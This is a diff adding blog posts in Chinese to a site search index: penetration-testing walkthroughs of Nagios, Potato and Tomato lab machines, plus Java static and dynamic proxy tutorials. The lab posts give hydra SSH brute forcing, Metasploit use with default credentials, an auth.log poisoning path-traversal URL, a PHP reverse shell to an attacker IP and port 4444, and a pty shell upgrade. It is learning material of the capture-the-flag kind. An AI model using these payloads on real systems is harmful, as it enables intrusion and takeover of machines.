@@ -862,4 +862,225 @@
 <p><img src="image-20201107214148115.png" alt="image-20201107214148115"></p>
 ]]></content>
   </entry>
+  <entry>
+    <title>Nagios渗透</title>
+    <url>/2020/11/08/Nagios%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<h1 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h1><p>经典NMAP</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nmap -sS -v -T4 -Pn -A -p <span class="number">0</span>-<span class="number">65535</span> <span class="number">172</span>.<span class="number">192</span>.<span class="number">168</span>.<span class="number">235</span>.<span class="number">135</span></span><br></pre></td></tr></table></figure>
+
+<p>drib</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">dirb http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">29</span>.<span class="number">128</span>/</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Nmap的结果如下：</p>
+<p><img src="image-20201108194244662.png" alt="image-20201108194244662"></p>
+<p>而dirb的结果：</p>
+<p><img src="image-20201108194339973.png" alt="image-20201108194339973"></p>
+<p>感觉有点鸡肋啊..dirb的结果</p>
+<h1 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h1><p>WTM直接用exp库</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">searchsploit nagios</span><br></pre></td></tr></table></figure>
+
+
+
+<p>msfconsole</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">search nagios</span><br></pre></td></tr></table></figure>
+
+<p>之后使用show options查看我们需要填写什么</p>
+<p>查看还需要设置的选项 show options，为YES且空的就是还需要我们设置的。 可以看到下图中RHOST参数还未设置内容</p>
+<p><img src="1089831-20170102213249769-373635510.png" alt="img"></p>
+<p>发现这个需要设置密码，于是尝试测试默认密码登陆NagiosXI，在该文章中得到账号为NagiosAdmin</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ywnz.com&#x2F;linuxyffq&#x2F;6587.html</span><br></pre></td></tr></table></figure>
+
+<p>密码为admin</p>
+<p>这里讲一下msfconsole怎么用的..</p>
+<h1 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h1><p>首先search 漏洞</p>
+<p>show options 可以查看有什么条件我们还没有设置</p>
+<p>再之后设置rhost和lhost，其中rhost为被攻击的机子</p>
+<p><strong>lhost为攻击机，也就是我们的kali</strong></p>
+<p>之后直接run，发现失败</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">] Exploit aborted due to failure: no-access: Authentication failed. Please provide a valid username and password.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>于是把我们刚刚得到的password填写上去admin</p>
+<p>得到run之后执行shell，whoami查看权限就是root了</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Java动态代理</title>
+    <url>/2020/11/10/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
+    <content><![CDATA[<p>Java动态代理再当前的Java代码中几乎随处可见，因为它既可以获取Java静态代理的可拓展性，并且它也可以让我们的代码变得并不繁琐，除此之外，正是由于Java的动态代理原理是反射，<strong>故还会引出很多安全问题</strong>，我们要知道，Java的反射本身就是不安全的一件事（Private首先就变得毫无意义了）</p>
+<p>话说回来，想要学习好动态代理，反射的学习是必不可免的，如果没有学习过我建议先学习反射，这里将一些API写罗列出来，方便没有学过反射，或者对反射并不熟悉的读者可以阅读后面的文章</p>
+<h1 id="反射API"><a href="#反射API" class="headerlink" title="反射API"></a>反射API</h1><h2 id="getClass"><a href="#getClass" class="headerlink" title="getClass"></a>getClass</h2><p>[一个实例对象].getClass ,将返回实例的类，我这里用如下代码进行演示：</p>
+<p>例子：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        myDemo wdnmd = <span class="keyword">new</span> myDemo();</span><br><span class="line"><span class="comment">//        System.out.println(myDemo);</span></span><br><span class="line">        System.out.println(wdnmd.getClass());</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myDemo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name = <span class="string">&quot;dasi&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> String secretName = <span class="string">&quot;wuhu&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>当前代码的输出结果为：</p>
+<p><img src="image-20201110200039318.png" alt="image-20201110200039318"></p>
+<p>我们可以很清楚的发现，获取了该对象</p>
+<h2 id="getclass-getInterfaces"><a href="#getclass-getInterfaces" class="headerlink" title="getclass().getInterfaces()"></a>getclass().getInterfaces()</h2><p>其实我们读名字也可以很清楚的明白它的用途了，用于获取当前的继承的接口</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        myDemo wdnmd = <span class="keyword">new</span> myDemo();</span><br><span class="line"><span class="comment">//        System.out.println(myDemo);</span></span><br><span class="line">        System.out.println(wdnmd.getClass().getInterfaces());</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">bark</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">jiao</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myDemo</span> <span class="keyword">implements</span> <span class="title">bark</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name = <span class="string">&quot;dasi&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> String secretName = <span class="string">&quot;wuhu&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">jiao</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;jiao&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>返回结果为：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[Ljava.lang.Class;@<span class="number">7f</span>31245a</span><br></pre></td></tr></table></figure>
+
+<p>这里便得到了类的接口了，只不过这里是以流的方式进行传输</p>
+<h2 id="getClass-getName"><a href="#getClass-getName" class="headerlink" title="getClass().getName()"></a>getClass().getName()</h2><p>这样的也很简单理解，我们即使getClass了，程序却不知道它的名字，程序只知道是一个类，故我们使用getName即可得到当前实例的类的名字（String形式）</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        myDemo wdnmd = <span class="keyword">new</span> myDemo();</span><br><span class="line"><span class="comment">//        System.out.println(myDemo);</span></span><br><span class="line">        System.out.println(wdnmd.getClass().getName());</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>
+
+<p>好像写一个动态代理也就用到了这些，嘛，继续往下吧</p>
+<h1 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h1><h2 id="2-1-接口"><a href="#2-1-接口" class="headerlink" title="2.1 接口"></a>2.1 接口</h2><p>首先和静态代理是一样的，我们也需要构筑一个接口：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> myProxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>同样的，业务实体是不可避免的</p>
+<h2 id="2-2实体类："><a href="#2-2实体类：" class="headerlink" title="2.2实体类："></a>2.2实体类：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> myProxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImp</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;增添了一个新用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;删除了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;更新了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;查询了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而代理类，通过动态代理我们可以直接的生成，取消繁琐的操作</p>
+<p>如果用静态代理，我们的代理是这样的：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> myProxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceProxy</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserServiceImp userServiceImp;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserServiceImp</span><span class="params">(UserServiceImp userServiceImp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userServiceImp = userServiceImp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">        userServiceImp.add();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;删除&quot;</span>);</span><br><span class="line">        userServiceImp.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;更新&quot;</span>);</span><br><span class="line">        userServiceImp.update();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;查询&quot;</span>);</span><br><span class="line">        userServiceImp.query();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[DEBUG]执行了&quot;</span>+name+<span class="string">&quot;方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>而使用动态代理之后：</p>
+<h2 id="2-3代理类"><a href="#2-3代理类" class="headerlink" title="2.3代理类"></a>2.3代理类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Demo3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> myProxy2.UserServiceImp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserServiceImp userServiceImp;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    IOC，让用户自定义需要什么接口来决定代理类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserServiceImp</span><span class="params">(UserServiceImp userServiceImp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userServiceImp = userServiceImp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    生成代理类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getProxy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(<span class="keyword">this</span>.getClass().getClassLoader(),</span><br><span class="line">                userServiceImp.getClass().getInterfaces(),<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//    必须重写的接口，并返回接口</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">        Object result = method.invoke(userServiceImp, args);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们发现不再需要一个一个套模板往上写了，如果我们需要增添新功能，只需要这样做：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="comment">//    必须重写的接口，并返回接口</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        log(method.getName());</span><br><span class="line">        Object result = method.invoke(userServiceImp, args);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[DEBUG]使用了&quot;</span>+name+<span class="string">&quot;方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>虽然我们前面去写生成一个的代码量看似很大，但是实际上这段代码是一个工具用的代码，<strong>是写死的。</strong>业务代码相当的端，从几十行骤减到十来行，并且我们的代理类不会随着工程的变大而变大，我们通过反射之后获取了类的方法</p>
+<p>而源码当中，invoke方法实际上也是通过setAccessible来实现的</p>
+<p><img src="image-20201110203729995.png" alt="image-20201110203729995"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Potato和Tomato渗透</title>
+    <url>/2020/11/08/Potato%E5%92%8CTomato%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<h1 id="Potato渗透"><a href="#Potato渗透" class="headerlink" title="Potato渗透"></a>Potato渗透</h1><p>也是经典的dirb和nmap扫一波</p>
+<p>nmap的结果</p>
+<p><img src="image-20201108210135725.png" alt="image-20201108210135725"></p>
+<p>dirb的结果</p>
+<p><img src="image-20201108210207483.png" alt="image-20201108210207483"></p>
+<p>也就发现了一个info.php能用，访问一些是phpinfo，呃，那再看看nmap，开了7120端口，看看，啥都没有，只能通过hypdra进行爆破咯，呃，账号密码都不知道，只能试试看了</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">hydra  192.168.1.113 ssh -s 7120  -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -t 4 -v -f</span><br></pre></td></tr></table></figure>
+
+
+
+<p>登陆上之后查看uname -a 查看能不能提权</p>
+<p>看见内核为ubuntu3.多，这种老版本一般可以直接提，尝试搜索</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">potato@ubuntu:/tmp$ uname -a</span><br><span class="line">Linux ubuntu 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>searchsploit Ubuntu 3.13.0</p>
+<p><img src="image-20201109103119279.png" alt="image-20201109103119279"></p>
+<p>利用-p指令找到存放位置，之后我们就可以直接拿下exp了，再上传到靶机的tmp目录下（因为tmp目录大部分情况下是777权限</p>
+<p><img src="image-20201109103447331.png" alt="image-20201109103447331"></p>
+<p>成功拿下！</p>
+<h1 id="Tomato渗透"><a href="#Tomato渗透" class="headerlink" title="Tomato渗透"></a>Tomato渗透</h1><p>首先经典drib和nmap扫一波</p>
+<p><img src="image-20201109103819079.png" alt="image-20201109103819079"></p>
+<p>nmap：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -v -T4 -Pn -A -p 0-65535</span><br></pre></td></tr></table></figure>
+
+<p><img src="Potato%E5%92%8CTomato%E6%B8%97%E9%80%8F/image-20201109104128465.png" alt="image-20201109104128465"></p>
+<p>发现8888端口和21，开了其他tcp和ssh的端口,但是都没法用，在info.php下发现文件包含</p>
+<p><img src="image-20201109110118801.png" alt="image-20201109110118801"></p>
+<p>尝试包含了一下etc/passwd就卡住了，不知道该怎么做。。</p>
+<hr>
+<p>这里记录下各个log的文件</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">9)/var/run/utmp 记录着现在登录的用户;</span><br><span class="line">10)/var/log/lastlog 记录每个用户最后的登录信息;</span><br><span class="line">11)/var/log/btmp 记录错误的登录尝试;</span><br><span class="line">12)/var/log/dmesg内核日志;</span><br><span class="line">13)/var/log/cpus CPU的处理信息；</span><br><span class="line">14)/var/log/syslog 事件记录监控程序日志；</span><br><span class="line">15)/var/log/auth.log 用户认证日志；</span><br><span class="line">16)/var/log/daemon.log 系统进程日志；</span><br><span class="line">17)/var/log/mail.err 邮件错误信息；</span><br><span class="line"></span><br><span class="line">18)/var/log/mail.info 邮件信息；</span><br><span class="line"></span><br><span class="line">19)/var/log/mail.warn 邮件警告信息；</span><br><span class="line">20)/var/log/daemon.log 系统监控程序产生的信息;</span><br><span class="line">21)/var/log/kern 内核产生的信息;</span><br><span class="line">22)/var/log/lpr   行打印机假脱机系统产生的信息;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>根据大佬的payload，其实我们可以知道，在当前环境下我们可以控制的log文件只有auth.log,因为只有个这个日志我们可以操作，比如我们写入一句话，再进行包含的话，不就是执行了命令了吗（<strong>这个思路真的骚</strong></p>
+<p>所以我们马上操作一波，这里我用xshell脸上·的</p>
+<p><img src="image-20201109113724842.png" alt="image-20201109113724842"></p>
+<p>马上执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;192.168.29.131&#x2F;antibot_image&#x2F;antibots&#x2F;info.php?image&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth.log&amp;cmd&#x3D;ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20201109113800161.png" alt="image-20201109113800161"></p>
+<p>再之后为了能够传脚本啥的啊，我们执行一波反弹shell：</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.29.129&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>urlencode一下</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">php%20-r%20&#x27;%24sock%3Dfsockopen(%22192.168.29.129%22%2C4444)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>弹到自己本机上即可。</p>
+<p><img src="image-20201109113953687.png" alt="image-20201109113953687"></p>
+<p>接下来我们求一个交互式的shell，发现python3可以用，所以接下来用Python打开一个交互式的shell</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>之后uname -a 看内核，exp一冲就完事了</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>静态代理</title>
+    <url>/2020/11/09/%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/</url>
+    <content><![CDATA[<p>好久没用了都有点忘了，现在捡起来学一下，之后还有用</p>
+<h1 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h1><h2 id="结合出租房子理解"><a href="#结合出租房子理解" class="headerlink" title="结合出租房子理解"></a>结合出租房子理解</h2><p><img src="%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/image-20201109214003006.png" alt="image-20201109214003006"></p>
+<p>通过图示，我们分析一个例子：</p>
+<ul>
+<li>客户需要租一个房子</li>
+<li>房东需要租出房子</li>
+</ul>
+<p>这个时候两者之间的合同很纯粹，如果两者认识，就不需要中介，直接对接把房子租出去就很简单很快了对吧？但是现实往往不是这样，更可能的是如下情况：</p>
+<ul>
+<li>房东和客户互不相识，需要签订各种合同保证对方不会后悔</li>
+<li>一个客户肯定不会只看房子，他需要看多个房子来选择自己心仪的房子</li>
+<li>房东不可能时时刻刻都守着房子，等一个一个的客户上门来看</li>
+</ul>
+<p>在这种情况下，用户的需求和房东的客户都相当不纯粹了，需要经过很多步骤才可以转换到位</p>
+<p><img src="%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/image-20201109214714721.png" alt="image-20201109214714721"></p>
+<p>在现实生活中，正是由于这种情况的出现，所以出现了房屋中介，解决各种客户的情况，由房屋中介来给客户们解决各种问题，经过中介处理，双方的情况又变得纯粹了起来，而繁琐的事情交给中介来处理即可</p>
+<p><img src="image-20201109214848811.png" alt="image-20201109214848811"></p>
+<p>而代码一样如此，这种情况的出现几乎处处可见，比如我们可能需要处理数据库，中间需要对数据进行各种处理，这种情况就和上面的合同一样。</p>
+<p>话说回来，我们如何处理租房子的情况呢？这里我写了一小段代码来做出范例：</p>
+<p>我们可以将这个事情抽象成四个part：</p>
+<ul>
+<li>出租房子这件事情</li>
+<li>谁出租？ 房东</li>
+<li>谁要房子？ 客户</li>
+<li>谁来处理复杂情况？ 中介</li>
+</ul>
+<p>分析完之后我们可以着手于代码</p>
+<p>出租房子这件事情：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Rent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rent</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>房东:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Host</span> <span class="keyword">implements</span> <span class="title">Rent</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;房东租出房子&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>中介：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyProxy</span> <span class="keyword">implements</span> <span class="title">Rent</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Host host;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyProxy</span><span class="params">(Host host)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.host = host;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        seeHouse();</span><br><span class="line">        host.rent();</span><br><span class="line">        takeMoney();</span><br><span class="line">        giveMoney();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">seeHouse</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;中介带你看房子&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">takeMoney</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;中介收你钱&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">giveMoney</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;中介给钱给房东&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>客户：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        MyProxy proxy = <span class="keyword">new</span> MyProxy(<span class="keyword">new</span> Host());</span><br><span class="line">        proxy.rent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在上面的例子当中，我们可以发现，静态代理帮我们完成了如下事情：</p>
+<ol>
+<li>使得需要再次明确起来，无论是客户还是房东，需求都变得相当简单</li>
+<li>复杂的事情交给了中介来做</li>
+</ol>
+<p>但是我们也发现了一个缺点：</p>
+<ol>
+<li>我们的代码量明显提升了很多，相比于直接添加功能</li>
+<li>除此之外，如果客户很多，我们不得不手动添加一个个客户，工作量更大了。</li>
+</ol>
+<h2 id="结合增删改查事务理解"><a href="#结合增删改查事务理解" class="headerlink" title="结合增删改查事务理解"></a>结合增删改查事务理解</h2><p>在上面的例子中，我们学习到了代理模式的第一个好处，接下的例子将进一步表露出上面的设计模式的好处，并且它会展现静态代理的第二个好处，<strong>添加新功能而不修改原有代码</strong></p>
+<p>增删改查事务：</p>
